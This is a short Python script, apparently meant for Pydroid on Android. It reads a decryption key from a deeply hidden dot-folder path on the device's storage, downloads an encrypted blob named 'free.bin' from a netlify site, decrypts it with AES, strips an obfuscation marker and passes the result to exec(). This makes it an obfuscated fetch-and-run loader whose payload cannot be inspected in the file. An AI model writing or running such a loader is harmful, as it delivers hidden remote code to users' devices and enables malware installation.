import requests
from Crypto.Cipher import AES
import os


version = "/sdcard/Download/.securedata/.system/.pversion/.pydroidver/.check3"


with open(version, "rb") as f:
    ver = f.read()

key="ogsecretkey69"
url = "https://og69username2.netlify.app/free.bin"
response = requests.get(url)
data = response.content

iv = data[:16]
ciphertext = data[16:]


cipher = AES.new(ver, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext)


pad_len = plaintext[-1]
plaintext = plaintext[:-pad_len]
junk_removed = plaintext.split(b'XYZOBFUSCATE_START', 1)[-1]

# Run the code
exec(junk_removed.decode(), {})
